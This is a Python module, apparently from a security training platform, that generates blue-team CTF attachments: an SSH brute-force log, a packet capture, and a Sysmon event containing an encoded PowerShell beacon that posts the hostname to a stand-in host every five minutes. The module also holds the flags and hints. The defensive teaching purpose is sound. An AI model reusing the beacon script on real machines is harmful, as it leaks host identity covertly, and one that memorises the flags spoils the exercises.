"""Builtin training content. Challenge attachments are generated deterministically here and the flag is derived from
the attachment itself, so a learner can only obtain it by doing the analysis. This is training material, not telemetry,
and none of it is ingested into the SIEM."""
import base64
import hashlib
import struct

# ------------------------------------------------------------------ attachments
MEMO = (b"INTERNAL MEMO - Finance\n"
        b"From: cfo-office\nTo: accounts-payable\nSubject: Vendor bank detail change\n\n"
        b"Please update the bank details for vendor 4471 before Friday's payment run.\n"
        b"This request was received by e-mail and has NOT been verified by phone.\n")


def auth_log() -> bytes:
    lines = []
    t = 0
    for ip, n in (("198.51.100.14", 6), ("192.0.2.200", 3), ("203.0.113.77", 9)):
        for i in range(n):
            t += 7
            lines.append(f"Nov 17 02:{t // 60:02d}:{t % 60:02d} bastion sshd[{4100 + t}]: Failed password for invalid user admin{i} from {ip} port {50000 + t} ssh2")
    t += 11
    lines.append(f"Nov 17 02:{t // 60:02d}:{t % 60:02d} bastion sshd[{4100 + t}]: Accepted password for backup from 203.0.113.77 port {50000 + t} ssh2")
    t += 3
    lines.append(f"Nov 17 02:{t // 60:02d}:{t % 60:02d} bastion sshd[{4100 + t}]: pam_unix(sshd:session): session opened for user backup by (uid=0)")
    for _ in range(4):
        t += 13
        lines.append(f"Nov 17 02:{t // 60:02d}:{t % 60:02d} bastion sshd[{4100 + t}]: Failed password for root from 198.51.100.14 port {50000 + t} ssh2")
    return ("\n".join(lines) + "\n").encode()


BEACON_SCRIPT = "$u='https://cdn-update-check.example/api/v2/ping';while($true){try{Invoke-WebRequest -Uri $u -Method POST -Body $env:COMPUTERNAME}catch{};Start-Sleep 300}"


def beacon() -> bytes:
    enc = base64.b64encode(BEACON_SCRIPT.encode("utf-16-le")).decode()
    return (f"Process creation event (Sysmon ID 1) exported from host ws-2\n"
            f"ParentImage: C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\n"
            f"Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n"
            f"CommandLine: powershell.exe -nop -w hidden -enc {enc}\n").encode()


def packet_capture() -> bytes:
    """Classic pcap with one TCP handshake and an HTTP request whose X-Session header hides the flag (hex)."""
    secret = "CR{p4ck3t_wh1sp3r}".encode().hex()
    http = (f"GET /status HTTP/1.1\r\nHost: intranet.lab\r\nUser-Agent: updater/1.0\r\nX-Session: {secret}\r\n\r\n").encode()
    src, dst = bytes([10, 10, 0, 21]), bytes([172, 16, 10, 10])

    def pkt(payload: bytes, flags: int, seq: int, ack: int, rev=False):
        s, d = (dst, src) if rev else (src, dst)
        sp, dp = (80, 49152) if rev else (49152, 80)
        tcp = struct.pack("!HHIIBBHHH", sp, dp, seq, ack, 5 << 4, flags, 64240, 0, 0) + payload
        ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + len(tcp), 1, 0x4000, 64, 6, 0, s, d)
        eth = b"\x02\x00\x00\x00\x00\x02" + b"\x02\x00\x00\x00\x00\x01" + b"\x08\x00"
        return eth + ip + tcp

    frames = [pkt(b"", 0x02, 1000, 0), pkt(b"", 0x12, 5000, 1001, rev=True), pkt(b"", 0x10, 1001, 5001), pkt(http, 0x18, 1001, 5001)]
    out = struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)
    for i, f in enumerate(frames):
        out += struct.pack("<IIII", 1763344800, i * 1000, len(f), len(f)) + f
    return out


ATTACHMENTS = {
    "hash-it-out": [("memo.txt", MEMO)],
    "log-detective": [("auth.log", auth_log())],
    "decode-the-beacon": [("sysmon-event.txt", beacon())],
    "packet-whisper": [("capture.pcap", packet_capture())],
}

# Flags are derived from the attachments above (or from the lab), never stored in the database in plaintext.
FLAGS = {
    "hash-it-out": "CR{" + hashlib.sha256(MEMO).hexdigest()[:16] + "}",
    "log-detective": "CR{203.0.113.77}",
    "decode-the-beacon": "CR{cdn-update-check.example}",
    "packet-whisper": "CR{p4ck3t_wh1sp3r}",
    "dmz-exposure": "CR{80}",
}

CHALLENGES = [
    {"slug": "hash-it-out", "title": "Hash it out", "category": "forensics", "difficulty": "beginner", "points": 100,
     "description": "A suspicious memo was collected as evidence. Before anything else, an examiner records its hash.\n\n"
                    "Compute the **SHA-256** of `memo.txt` exactly as provided. The flag is `CR{` + the first 16 hex characters (lowercase) + `}`.",
     "hints": [("Most systems ship a tool: `sha256sum` (Linux), `shasum -a 256` (macOS), `Get-FileHash` (PowerShell).", 10),
               ("Do not open and re-save the file: editors can change line endings and therefore the hash.", 20)]},
    {"slug": "log-detective", "title": "Log detective", "category": "blue-team", "difficulty": "beginner", "points": 150,
     "description": "The bastion host's `auth.log` shows a burst of SSH failures overnight.\n\n"
                    "Which source IP address **successfully** logged in after failing first? Flag: `CR{<ip>}`.",
     "hints": [("Search for the word `Accepted`.", 15), ("Check that the same address also appears in `Failed password` lines before it.", 25)]},
    {"slug": "decode-the-beacon", "title": "Decode the beacon", "category": "malware", "difficulty": "intermediate", "points": 200,
     "description": "Word spawned a hidden PowerShell process on ws-2. The command line is in `sysmon-event.txt`.\n\n"
                    "Decode the encoded command and find the **host name** the script beacons to. Flag: `CR{<hostname>}`.",
     "hints": [("`-enc` takes Base64 of UTF-16LE text.", 20), ("In PowerShell: `[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($s))`.", 40)]},
    {"slug": "packet-whisper", "title": "Packet whisper", "category": "network", "difficulty": "intermediate", "points": 200,
     "description": "An updater on the LAN talks to the intranet web server. Analysts believe it smuggles data in a request header.\n\n"
                    "Open `capture.pcap`, find the HTTP request and recover the hidden value. The flag has the form `CR{...}`.",
     "hints": [("Wireshark: Follow → TCP Stream, or `tcpdump -A -r capture.pcap`.", 20), ("The X-Session header is hex-encoded text.", 40)]},
    {"slug": "dmz-exposure", "title": "DMZ exposure check", "category": "network", "difficulty": "beginner", "points": 100, "lab_template": "corporate-dmz",
     "description": "Deploy the **Corporate DMZ** lab (button below; it runs isolated in your own lab). From the Mail Relay node, check which TCP "
                    "service port is open on the Web Server (web-1). Use the Vulnerability Management scanner or an authorised assessment.\n\n"
                    "Flag: `CR{<port>}`.",
     "hints": [("Vulnerability Management → New scan → scanner mail-1, target web-1, profile quick.", 20)]},
]


MISSIONS = [
    {"slug": "first-light", "title": "Operation First Light", "difficulty": "beginner", "lab_template": "corporate-dmz",
     "briefing": "You join the night shift of a small SOC. Learn the basics, then investigate the bastion host's overnight SSH activity.",
     "objectives": [
         {"title": "Solve the CTF challenge 'Log detective'", "kind": "challenge", "config": {"slug": "log-detective"}, "points": 25},
         {"title": "Which subnet (CIDR) is the DMZ in the Corporate DMZ template?", "kind": "answer", "answer": "172.16.10.0/24", "points": 15,
          "hint": "Open the template in the Network Topology Editor and inspect the DMZ subnet."},
     ]},
    {"slug": "close-the-gaps", "title": "Close the gaps", "difficulty": "intermediate", "lab_template": "corporate-dmz",
     "briefing": "Management wants proof that the web tier is hardened. Find the weaknesses in your own lab, validate exposure with an authorised "
                 "assessment, and know the fix.",
     "objectives": [
         {"title": "Have a vulnerability scan of your lab report 'Web server discloses its version' (CR-VA-005)", "kind": "vuln_finding", "config": {"code": "CR-VA-005"}, "points": 30,
          "hint": "Deploy the lab, then Vulnerability Management → New scan from mail-1 to web-1."},
         {"title": "Complete an approved assessment of scenario RT-WEB-01 in your lab", "kind": "assessment", "config": {"scenario": "RT-WEB-01"}, "points": 40,
          "hint": "Attack Simulation → request; a second person must approve before you can execute."},
         {"title": "Which nginx directive hides the version in the Server header? (directive name only)", "kind": "answer", "answer": "server_tokens", "points": 15},
     ]},
]
